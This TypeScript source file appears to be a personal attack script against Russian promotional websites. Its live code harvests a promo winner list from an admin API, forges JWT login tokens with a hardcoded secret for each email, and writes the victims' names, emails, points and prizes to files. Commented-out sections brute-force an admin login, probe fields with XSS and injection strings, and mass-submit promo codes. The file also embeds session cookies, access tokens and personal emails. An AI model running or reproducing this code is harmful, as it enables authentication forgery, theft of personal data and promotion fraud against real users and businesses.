import {URLSearchParams} from 'url';
import {emails} from "./utils";
const jwt = require('jsonwebtoken');
import * as FS from 'fs';
import * as path from "path";
import {CustomRequest} from "./utils/request";

// import * as opt from 'optimist';
// import {CheckCookie} from "./check-cookie";
// import {SmsSenderDelivery, VK} from "./utils";
// import {sleep} from "./sms-activate";
//
// const HttpsProxyAgent = require('https-proxy-agent');
// var agent = new HttpsProxyAgent("http://92.39.138.98:31150");
// // var agent = new HttpsProxyAgent("http://78.85.36.203:8080");
//
// const readline = require('readline');
//
// const rl = readline.createInterface({
//   input: process.stdin,
//   output: process.stdout
// });
//
(<any>global).fetch = require("node-fetch");
(<any>global).URLSearchParams = URLSearchParams;

export class Mcdonalds {
  private userId: string = "427408928"; //test
  private botId: string = "-30108525"; //
  // private botId: string = "-9580285"; //
  private token: string = '240797cd89f441844bce578e1f338aa40833fd460592606234bb88804a7f5117f705b4db507c7c3e359cd';

  public async start(code: string, accessToken?: string) {
    const res = await this.sendMessage('Промокод', this.token, '2');
    // const res = await this.sendMessage('Да, он просто бомба!', this.token);
    console.log(code, JSON.stringify(await res.json()));
    // await this.sendMessage('#ВсеЕщеБигМак', accessToken);
    const sleep1 = randomBetween(500, 600);
    await sleep(sleep1);
    // await this.sendMessage('Да', accessToken);
    await this.sendMessage(code, this.token);
    // const sleep3 = randomBetween(20000, 25000);
    const sleep3 = randomBetween(500, 600);
    await sleep(sleep3);
  }

  private async sendMessage(message: string, token: string, buttonId?: string) {
    let button= JSON.stringify({"button": buttonId});
    const url = `https://api.vk.com/method/messages.send?user_id=${this.botId}&message=${encodeURIComponent(message)}&v=5.37&access_token=${token}&payload=${button}`;
    return await fetch(url);
  }

  private async getHistory(token: string) {
    const url = `https://api.vk.com/method/messages.getHistory?user_id=${this.botId}&v=5.37&access_token=${token}`;
    return await fetch(url);
  }
}

function randomBetween(start, end) {
  return Math.floor(Math.random() * end) + start;
}

(async () => {
  const values = {};
  const request = new CustomRequest({}, true);
  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?query=&date=2019-05-31&page=1&count=1000").catch(value => <any>console.log(value));
  const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100&page=4").catch(value => <any>console.log(value));
  const data = res.data;

  for (let value of data) {
    if (!value.client) { continue; }
    values[value.client.email] = value.client;
  }

  // for (let i = 1000; i < 10000; ++i) {
  //   let token = Buffer.from('sergeicykalo@yanex.ru:123\'').toString('base64');
  //   const res = await fetch("https://adm.dirolpromo.ru/api/auth", { headers: { Authorization: token }, method: 'POST'});
  //   console.log(JSON.stringify(await res.text()));
  // }

  // const res = await fetch("https://adm.dirolpromo.ru/api/feedback", { method: 'POST', body: "{{}"});
  // const res = await fetch("https://adm.dirolpromo.ru/api/remember-password", { method: 'POST', body });
  // console.log(await res.json());
  // const arr = ;

  // for (let i = 0; i < arr.length; ++i) {
  // for (let i = 1; i < 10000; ++i) {
  //   // let winner = arr[i];
  //   await main(i, 'jokci.k@gmail.com');
  //
  //   await sleep(1000);
  // }
  const keys = Object.keys(values);
  for (let i = 0; i < keys.length; ++i) {
    const a = await main(request, keys[i]);
    if (a) { i--; }
  }
  // await main('tataflower@list.ru');


  // const a = await fetch("https://adm.dirolpromo.ru/api/auth", {"credentials":"include","headers":{"accept":"application/json, text/plain, */*","accept-language":"uk,ru;q=0.9,en;q=0.8","authorization":"dmFsaW1wZXRyb3YxOTkzQGdtYWlsLmNvbTo2MTIx","cache-control":"no-cache","content-type":"application/json;charset=UTF-8","pragma":"no-cache"},"referrer":"https://dirolpromo.ru/","referrerPolicy":"no-referrer-when-downgrade","body":"{}","method":"POST","mode":"cors"});

  // const arr = [ '1', '3', '4', 'A', 'B', 'C', 'D', 'E', 'F', 'H', 'K', 'M', 'N', 'P', 'Q', 'R', 'T', 'W', 'X', 'Z' ];
  // const text = FS.readFileSync('cookie/uniq.txt').toString();
  // const arrPromos = text.split('\n');
  //
  // let active = [
  //   'A11MZ1PZ',
  //   'A11P4D44',
  //   'A11PD44H',
  //   'A11WMAAF',
  //   'A11ZX1PR',
  //   'A131TRED',
  //   'A13CDCMM',
  //   'A13DC11M',
  //   'A13EXEDH',
  // ]
  //
  // const objPromos = {};
  // const objPromosSlice4 = {};
  // for (let i = 0; i <arrPromos.length; ++i) {
  //   // objPromos[arrPromos[i]] = true;
  //   // objPromosSlice4[arrPromos[i].slice(4)] = true;
  //   let f = '';
  //   for (let j = 0; j < arrPromos[i].length; ++j) {
  //     f += arrPromos[i][j]
  //   }
  // }
  //
  // let a = [ ...new Set(Object.keys(objPromos))];
  // console.log(a.sort());
  // console.log(a.length);
  //
  // let mac = new Mcdonalds();
  // // const token = await main(103254,'valimpetrov1993@gmail.com');
  // let idx = 0;
  // for (let promo of active) {
  //   // for (let two of arr) {
  //   //   idx += 1;
  //
  //     // let promo = 'AAAAAA' + one + two;
  //     // if (objPromos[promo]) { continue; }
  //     // if (objPromosSlice4[promo.slice(4)]) { continue; }
  //
  //     let body = { promocode: promo };
  //
  //     // const res = await fetch("https://dirolbot.special.ktsstudio.com/api/events", { method: 'POST', headers: { Authorization: 'tPhzjaz6EqXnTCLBKGhnmHyB8HBgurp7' }, body: JSON.stringify(body)});
  //     // console.log(promo, await res.json());
  //     await mac.start(promo);
  //
  //     // if (idx % 4 !== 0) {
  //     //   FS.appendFileSync('cookie/uniq.txt', promo + '\n');
  //     // }
  //     await sleep(100);
  //   // }
  // }


})();



async function main(request: CustomRequest, email) {
  const secretKey = '[N%"D9&RJ{_A3EkK5`7dkh+%:';
  const now = Date.now() / 1000 - 400;

  const token = jwt.sign({ "iss": "Raiffeisen", email, user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
  // const refreshToken = jwt.sign({ "iss": "Raiffeisen",  user_id: 0, "iat": now, "exp": now + 900 }, secretKey);
  //
  //
  //
  // const cookieToken = `{%22accessToken%22:%22${token}%22%2C%22refreshToken%22:%22${refreshToken}%22%2C%22expires_in%22:1555012608}`;
  // console.log(cookieToken);
  // return;
  // console.log(cookieToken);
  // return;
  //<script type="text/javascript" src="scripts.c4e6a0cd08523fd1390d.js"></script>
  // let res = await fetch(" https://adm.dirolpromo.ru/api/client", { headers: { 'Authorization': token } });

  try {
// console.log('123');
  // let body = JSON.stringify({ client: { approve: true, email: "valimpet.rov1993@gmail.com", name: "'%`$%^&*'", phone_number: '<script type="text/javascript" src="https://docs.nestjs.com/scripts.c4e6a0cd08523fd1390d.js"></script>', surname: "'%`$%^&*'" } });
  let res = await request.get("https://adm.dirolpromo.ru/api/client", { headers: { 'Authorization': token } });
  // let res = await fetch(" https://adm.dirolpromo.ru/api/client/prize", { headers: { 'Authorization': token }, method: 'POST', body: JSON.stringify({ prize_id: " fasdf" }) });
  // let res = await fetch(" https://adm.dirolpromo.ru/api/remember-password", { method: 'POST', body: JSON.stringify({ email: "%';``&^_" }) });

    const json = res.data;
    // console.log('3', json)
    if (!json.client) { return true }
    fetch("https://adm.dirolpromo.ru/api/client/prizes", { headers: { 'Authorization': token } }).then(text => text.json())
      .then(value => FS.appendFileSync('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));

    console.log(`${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}`);
    FS.appendFileSync('cookie/result22.txt', `${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}` + '\n');
  } catch (e) {
    console.log(e)
  }

  return;
  //
  // // let cookie = "_ym_uid=1554919771262155861; _ym_d=1554919771; _ga=GA1.2.1581773223.1554919771; _gid=GA1.2.56025350.1554919771; _ym_isad=2; token={%22accessToken%22:%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwiZW1haWwiOiJ2LnN1c2hrb3YzNUBtYWlsLnJ1IiwidXNlcl9pZCI6ODc2LCJpYXQiOjE1NTQ5MTk5MDgsImV4cCI6MTU1NTAwNjMwOH0.CsYJm0MG87ZDyBvfWYc9ag_EymF2YseDlU4y51WvZEQ%22%2C%22refreshToken%22:%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwidXNlcl9pZCI6ODc2LCJpYXQiOjE1NTQ5MTk5MDgsImV4cCI6MTU1NzUxMTkwOH0.d8EKxtZg3aeRUlpMhnv63YiYdCLp4cMQsEZepxysBks%22%2C%22expires_in%22:1555006308}";
  // // let cookie = "_ym_uid=1554919771262155861; _ym_d=1554919771; _ga=GA1.2.1581773223.1554919771; _gid=GA1.2.56025350.1554919771; _ym_isad=2; token=" + cookieToken;
  // // let res = await fetch("https://dirolpromo.ru/personal", { headers: { cookie } });
  // let r = await fetch("https://dirolbot.special.ktsstudio.com/api/events", { headers: { 'Authorization': token } });
  // return console.log(await r.text());
  //
  // let cookie = 'token={%22accessToken%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwiZW1haWwiOiJzZXJnZWljeWthbG9AeWFuZGV4LnJ1IiwidXNlcl9pZCI6MSwiaWF0IjoxNTQ0OTI2MjA4LCJleHAiOjE1NTUwMTI2MDh9.CaTw-J0Xo-ac1hwkvT0U0JP4jVfgoAt4pim_en9bYkg%22%2C%22refreshToken%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJSYWlmZmVpc2VuIiwidXNlcl9pZCI6MSwiaWF0IjoxNTQ0OTI2MjA4LCJleHAiOjE1NTUwMTI2MDh9.DyFEe9EE-s5B5Qmz7D3u7wBIA1S8rN-gPGcJIOBipco%22%2C%22expires_in%22:1555012608}; _ga=GA1.2.295440183.1554986192; _gid=GA1.2.2053055001.1554986192; _ym_uid=1554986192140444230; _ym_d=1554986192; _ym_isad=1; _ym_visorc_52806562=w; XSRF-TOKEN=eyJpdiI6IlUxQm1ydGZFb0hWck1XbFNZNGtNblE9PSIsInZhbHVlIjoiU1wvTE8zdnlcL3JLN2RhYUorV1NwMzBrS2hyb0VcL0szcW11dUF4dFZIb3FYXC9zKzIxVmNmVW9JM1p6bGRCY1lwUU4iLCJtYWMiOiI1YjY2YzY3MTI2YmZiNjNkMzgxM2IyNzUyNzczNzgyY2E3OTc2OWViNWFhOWE4MjA3OTcyMTVlMzU1N2Y0ZmY1In0%3D; dirolpromo_session=eyJpdiI6InBPRWpoR0Y0XC81K0ZMK3ZPdHE0OU9nPT0iLCJ2YWx1ZSI6IlVKZjNNeFZ0K0UyVTRuTDl5VTBcL2Zkb1BLWitwUzYrUWM3Rm04c1pyN295aTZmbHdRejdjZTFUUHVQY0U2RXF2IiwibWFjIjoiYzkyZmRmZTM2MDQ5YmZkMDgzZTVmYTZiZDZhNjIzMDcxNmUzODdhOGNjNWU4NGMwN2Y3MGZiZTViYTQ4YWNkOSJ9';
  // let loginBody = JSON.stringify({ _token: 'CVNaMCZkZOsmPzwtlHZpPgv3gJ3Jbv4xa5Bxwcny', email: 'sergeicykalo@yandex.ru', password: 'dirol' });
  //
  // let url = new URLSearchParams();
  // url.append("_token", "CVNaMCZkZOsmPzwtlHZpPgv3gJ3Jbv4xa5Bxwcny");
  // url.append("email", "sergeicykalo@yandex.ru");
  // url.append("password", "YtlTVajBRu07sIvQmv2bPNj/FHeEpvkgF5KO4GHgRFM=");
  //
  // let res3 = await fetch("https://adm.dirolpromo.ru/login", { headers: { 'Authorization': token, cookie }, method: 'POST', body: url });
  // // const clientInfo = await res.json();
  // // console.log((await res3.text()).indexOf("Войти в режим администрирования"));
  // console.log((await res3.text()).indexOf("Неверный логин или пароль"));
  // process.exit();
  // return;
  // // FS.appendFileSync('cookie/access.txt', JSON.stringify(clientInfo) + '\n');
  //
  // let res2 = await fetch(" https://adm.dirolpromo.ru/api/client/promocode", { headers: { 'Authorization': token } });
  // const promocodes = (await res2.json()).map(promo => promo.code);
  // for (let i = 0; i < promocodes.length; ++i) {
  //   FS.appendFileSync('cookie/error.txt', promocodes[i] + '\n');
  // }

}















































async function logs(address: string) {
  let res = await fetch(address);
  const texts = (await res.text()).split('\n').reverse();
  let matches = texts.map(text => text.match(/Token (.*?);.*?Количество коинов:(.*?)Скорость:(.*?)\./)).filter(value => !!value);
  let infos = matches.map(match => {
    return {
      token: match[1],
      value: match[2].trim(),
      speed: match[3].trim()
    }
  });

  let obj = {};
  for (let info of infos) {
    obj[info.token] = info;
  }

  const keys = Object.keys(obj);
  const active = keys.map(key => obj[key]);

  return { site: address, count: keys.length, active };
}

export function sleep(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}
//
// const argv = opt
//   .usage('Usage: $0 --cookie [boolean] --service [smsactivate/simsms] --fast [false/true]')
//   .default('cookie', 'true')
//   .default('fast', 'false')
//   .default('service', 'smsactivate')
//   .demand(['cookie', 'service'])
//   .argv;
//
// function formatNumber(p: string) {
//   // phone: "+7 ( 918 ) 290 - 30 - 65", //9182903065
//   return `+${p[0]} ( ${p[1]+p[2]+p[3]} ) ${p[4]+p[5]+p[6]} - ${p[7]+p[8]} - ${p[9]+p[10]}`;
// }
//
// function fetchRequestInit({ cookie, body, method, json } = <any>{}) {
//   method = method || "POST";
//   json = json === undefined ? true : json;
//   console.log('fetchRequestInit', json ? JSON.stringify(body) : body.get("ksid"));
//   return <any>{
//     agent,
//     headers: {
//       'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 YaBrowser/18.11.1.716 Yowser/2.5 Safari/537.36",
//       'X-Compress': null,
//       cookie,
//     },
//     method,
//     body: json ? JSON.stringify(body) : body,
//     timeout: 10000
//   }
// }
//
// function mergeCookie(cookie1, cookie2) {
//   const split1 = cookie1.split('; ');
//   const split2 = cookie2.split('; ');
//
//   const split: string[] = [...split1, ...split2];
//   return split.join('; ');
// }
//
// (async () => {
//
//
//   // const cookie = `_ym_uid=1548099959374740671; mda=0; yandexuid=350733461538151571; yandex_gid=4; my=YwA=; fuid01=5c47176627554069.dnIL8puu1uU2MHNavZ8KiWFIQSY1Rz1ZuEGeoqif46hzd4SDJCNM1qAQgsq6FQ2w-ac-A9KSa5Y5OrrfMmDTtVFUdI4-8Bvt1WduklAWpDnAK6AiG8y96_FNVwm8gov3; Session_id=3:1548242167.5.0.1548099963537:jpE-bQ:12.1|82637876.0.2|1130000035889612.82605.2.2:82605|1130000036041961.82617.2.2:82617|193842.971658.-tymKBxn2Kr7QBKkQ1RvSlrH-EY; sessionid2=3:1548242167.5.0.1548099963537:jpE-bQ:12.1|82637876.0.2|1130000035889612.-1.0|1130000036041961.-1.0|193842.390839.AcbiilS_31qo12ppbNBy48HId7s; L=c1x+ckBIVGJ+YVhdVAhqb38AYWsEQQcFGTo8C14i.1548242167.13754.36541.3fedebdbf460d161c9ce29851cd1ce82; yandex_login=jokcik; i=6PO9u9K/2qmCgELYBafA9F24GhMSAtxX3i6u0O/nDK3WV0hHCGay9xEGzUihFQ9CaTlViIzZGGuBpiqobjvDP1Z5xmI=; __utmv=190882677.|2=Account=Yes=1^3=Login=Yes=1; _ym_isad=2; _ym_d=1548345081; yabs-frequency=/4/300001tUILm00000/Rv1oSBWp8TzLi72uCo40/; zm=m-white_bender.webp.css-https%3Awww_oZ9bjgZCpSYDSbXfwmqVS4XbErc%3Al; _ym_visorc_24226447=w; ys=udn.cDpqb2tjaWs%3D#ymrefl.1B028BDD3228FF89#wprid.1548356521808747-712959075890389487972696-sas2-9719; yp=1550948523.shlos.1#1563948050.szm.2:1920x1200:1920x897#1863602167.udn.cDpqb2tjaWs%3D#1863460783.yrtsi.1548100783#1550754916.ygu.1#1549372518.ysl.1#1550841327.csc.1#1863542568.multib.1; yc=1548615734.zen.cach%3A1548259764; _csrf=LNfyYqloDHbVsj-V_kRROpt8; partner_uid=s%3Aa009536f762389d035d8c72407aaafb2.Ih%2FQsniQk5IdxkFge1UPUuF470rpU9WIaD5TA2RiEIs; rheftjdd=rheftjddVal; _ym_visorc_115081=b; afisha.sid=s%3A4OjTl9etmPvFB6AdBW1eLV_pO7iHc1U-.o7x8ptmusHEZzhGR5n1H0lBzByqiav3TVbZ%2BdfMH1J8; device_id="adb59e468a594684dc953cd09d2f3e4c6689d0dea"`;
//   // const headers = {
//   //   'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
//   //   'x-csrf-token': 'Hzo73GST-aiCe-9h6j1aWqbaP6VLylFnZvlU',
//   //   'X-Requested-With': 'XMLHttpRequest',
//   //   'X-Retpath-Y': 'https://afisha.yandex.ru/moscow/concert',
//   //   cookie,
//   // };
//   //
//   // // const urlSearchParams = new URLSearchParams();
//   // // urlSearchParams.append("city", "moscow");
//   // const res = await fetch("https://afisha.yandex.ru/api/subscribe/global?city=moscow", { method: "POST", headers, body: JSON.stringify({ email: "jokcik@gmail.com" }) })
//   // console.log(await res.text());
//   // // const authUrl = "https://goods.ru/api/market/v1/securityService/extraAuthentication/authenticate";
//   // // const keySendUrl = "https://goods.ru/api/market/v1/securityService/extraAuthentication/keySend";
//
//
//
//   // "+7 ( 918 ) 290 - 30 - 65"
//   // "+7 ( 988 ) - 35 - 94"
//
//
//   // const urlParams = new URLSearchParams();
//   // urlParams.append("ksid", )
//
//   // const vk = new VK();
//   // for (let i = 0; i < 10000; ++i) {
//   //   await vk.checkAdmin();
//   //   console.log(i + 1);
//   //   await sleep(4000);
//   // }
//   // const isCookie = argv.cookie;
//   // const service = argv.service;
//   // const fast: boolean = argv.fast === 'true';
//   //
//   // if (isCookie === 'true') {
//   //   const cookie = new CheckCookie(fast);
//   //   cookie.run();
//   //
//   //   return;
//   // }
//   //
//   // for (let i = 1; i < 2; ++i) {
//   //   start(service);
//   // }
// })();
//
// async function start(service: string) {
//   const sender = new SmsSenderDelivery();
//   for (let i = 0; i < 20000; ++i) {
//     console.log(i);
//     await sleep(1000);
//     await sender.run(service === 'smsactivate' ? 1 : 0);
//   }
//   process.exit();
// }
//
// // (async () => {
// //
// //   let cookie = 'PHPSESSID=spudvadm4d7ss68j09cj5ig2b1';
// //   const affraidId = '9235';
// //   const productId = '303420034';
// //   const phone2 = '926';
// //   const phone1 = '7296597';
// //   const openhourFrom = '11:00';
// //   const openhourTo = '23:59';
// //
// //   const req = await fetch("https://belgorod.delivery-club.ru", {headers:{ cookie } });
// //   const text = await req.text();
// //   const regExp = new RegExp("meta name=\"csrf-token\" content=\"(.*)\"");
// //   const [, token] = regExp.exec(text);
// //   console.log('token: ', token);
// //
// //   const paramsCartEmpty = new URLSearchParams();
// //   paramsCartEmpty.append('empty_cart', 'true');
// //   paramsCartEmpty.append('s_id', affraidId);
// //   const cardEmpry = await fetch("https://belgorod.delivery-club.ru/ajax/cart/", {headers: { cookie, 'x-csrf-token': token},body: paramsCartEmpty, method:"POST", });
// //   console.log('empty: ', await cardEmpry.text());
// //
// //   const paramsCart = new URLSearchParams();
// //   paramsCart.append('product_id', productId);
// //   paramsCart.append('quantity', '1');
// //   paramsCart.append('s_id', affraidId);
// //   paramsCart.append('byWeight', '0');
// //
// //   const card = await fetch("https://belgorod.delivery-club.ru/ajax/cart/", {headers: { cookie, 'x-csrf-token': token },body: paramsCart, method:"POST", });
// //   console.log('card: ', await card.text());
// //
// //
// //   const params = new URLSearchParams();
// //   params.append('user_type', 'RegisteredWithoutAddress');
// //   params.append('phone1', phone1);
// //   params.append('phone1_code', phone2);
// //   params.append('department_id', 'Выбрать ресторан');
// //   params.append('pickup_date', '0');
// //   params.append('pickup_time_h', '-1');
// //   params.append('pickup_time_m', '-1');
// //   params.append('person_count', '1');
// //   params.append('is_delivery_asap', '1');
// //   params.append('preorder_date', '2019-01-01');
// //   params.append('preorder_time_h', '19');
// //   params.append('preorder_time_m', '00');
// //   params.append('delivery_cost', '0');
// //   params.append('delivery_min_order', '600');
// //   params.append('ignore_warnings', '0');
// //   params.append('promo_discount', '0');
// //   params.append('promo_discount', '0');
// //   params.append('checkout_type', 'default');
// //   params.append('send', '1');
// //   params.append('checkout_locked', '0');
// //   params.append('affiliate_id', affraidId);
// //   params.append('delivery_24_hours', '0');
// //   params.append('delivery_time_preorder', '2');
// //   params.append('openhour_from', openhourFrom);
// //   params.append('openhour_to', openhourTo);
// //   params.append('online_payment', '1');
// //   params.append('promo_code', 'testtest');
// //
// //   const promos = [
// //     // "NY19KW3V3ARNN",
// //     // "NY19SV6NYGWDN",
// //     // "NY19KRAG4CMYQ",
// //     "NY19KZPQ9TZNR",
// //   ];
// //
// //
// //   for (let i = 0; i < promos.length; ++i) {
// //     let promo = promos[i];
// //     params.delete('promo_code');
// //     params.append('promo_code', promo);
// //
// //     const res = await fetch("https://belgorod.delivery-club.ru/ajax/promocode", {headers:{ cookie },body: params, method:"POST", });
// //
// //     console.log(promo, JSON.stringify(await res.json()));
// //     // await sleep(1000);
// //
// //     let paramsDrop = new URLSearchParams();
// //     paramsDrop.append('affiliate_id', params.get('affiliate_id'));
// //     paramsDrop.append('delivery_cost', params.get('0'));
// //     const resDrop = await fetch("https://belgorod.delivery-club.ru/ajax/drop_promo", {headers:{ cookie },body: params, method:"POST"});
// //     console.log(JSON.stringify(await resDrop.text()));
// //     await sleep(1000);
// //   }
// //
// //
// // })();
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
// // (async () => {
// //   let arr = [
// //     "NY19E6V0HLLSG",
// //     "NY19EK52UJ8ND",
// //     "NY19EXSBE2BCG",
// //     "NY19ERS8Y2PZE",
// //     "NY19ECMLWIN7C",
// //     "NY19ECYTI94ND",
// //     "NY19EP8NEVAVF",
// //     "NY19EN36QWKIA",
// //     "NY19EEVHI2H7C",
// //     "NY19EA7YDCSND",
// //     "NY19EZB0G9T7G",
// //     "NY19ECH2WMLYA",
// //     "NY19ELRCAN5YE",
// //     "NY19E9J3ACMAC",
// //     "NY19EDJ9HE6XA",
// //     "NY19EIC2I2Z6C",
// //     "NY19EM0NTSCLI",
// //     "NY19E7WFH2F5H",
// //     "NY19EKOQIEXIE",
// //     "NY19E8YLZAJAC",
// //     "NY19ERQER50YE",
// //     "NY19EKQN94TQC",
// //     "NY19EXA23ZVMD",
// //     "NY19EHY48KX9B",
// //     "NY19EMBI766GA",
// //     "NY19E27KZRQ9B",
// //     "NY19EEKHCN25C",
// //     "NY19EYO0PY9WA",
// //     "NY19E7DJGDK6G",
// //     "NY19ETZSY3BKI",
// //     "NY19EUNQZ7E4H",
// //     "NY19EE1FZFQSB",
// //     "NY19EHD60U6JI",
// //     "NY19E6N70TU5C",
// //     "NY19EVCJWGJBB",
// //     "NY19EBZYTBLSB",
// //     "NY19E9E5Q0O5C",
// //     "NY19ESSV5UKGA",
// //     "NY19ESR0MYJLZ",
// //     "NY19EYHRC5SXE",
// //     "NY19ELC1RE48B",
// //     "NY19E4VSZTGDF",
// //     "NY19ETT3UC9AB",
// //     "NY19E62ITC5AB",
// //     "NY19EG7G7ZK0D",
// //     "NY19EV6VGTFXE",
// //     "NY19ERMLFQN8B",
// //     "NY19E0567GBXE",
// //     "NY19E6O6XCAXE",
// //     "NY19E00OA00PG",
// //     "NY19ELKWYJURB",
// //     "NY19ECPT9TO3P",
// //     "NY19EMA05T0PG",
// //     "NY19EOQEBQYCF",
// //     "NY19EPU8MM2GE",
// //     "NY19EO4W62A0D",
// //     "NY19E1GYPCO9F",
// //     "NY19ECNM0MOOC",
// //     "NY19EJEIRY0II",
// //     "NY19EPISODVGE",
// //     "NY19EEN792WSF",
// //     "NY19E82ZO8XII",
// //     "NY19E7OY3134M",
// //     "NY19EFGN8VOCF",
// //     "NY19ESU0YRYZD",
// //     "NY19E1VMCHMGE",
// //     "NY19EOISL5QKD",
// //     "NY19E5E9ATJ2H",
// //     "NY19ELUUJGDOC",
// //     "NY19E5HQDB5QB",
// //     "NY19E0B40V2NC",
// //     "NY19EQ4COFH2H",
// //     "NY19E6Y8K57RF",
// //     "NY19E5KVEOB7B",
// //     "NY19E9G718JOG",
// //     "NY19E1JNF34YD",
// //     "NY19EUZQERZFE",
// //     "NY19EIJUOXN1H",
// //     "NY19EAYV3FB3C",
// //     "NY19EGJC5ANBF",
// //     "NY19E75GVZW6B",
// //     "NY19EXTQFDNVE",
// //     "NY19E771JWLVE",
// //     "NY19ESV2GVUYD",
// //     "NY19EB6BDJWMC",
// //     "NY19E87HPECFE",
// //     "NY19EVA6URK6B",
// //     "NY19EEX1UX60H",
// //     "NY19EQ5M5AAVE",
// //     "NY19EIBM4E20H",
// //     "NY19EQIB2U2NG",
// //     "NY19EC4VDP2GI",
// //     "NY19EUTTFIZNG",
// //     "NY19E04ATJKCC",
// //     "NY19EJEUUB2EE",
// //     "NY19EB0WHKM2C",
// //     "NY19EU31DKWVG",
// //     "NY19EJ0KQFY0H",
// //     "NY19E3U7UEVQF",
// //     "NY19ECNDORIEE",
// //   ];
// //
// //   for (let i = 0; i < arr.length; ++i) {
// //     const token = 'DSNaUpz2wisZ1bA3to4xKcPGO0uCqdYy';
// //     (await fetch(`http://crierbot.appspot.com/${token}/send?message=${encodeURIComponent(arr[i])}`));
// //   }
// // })();
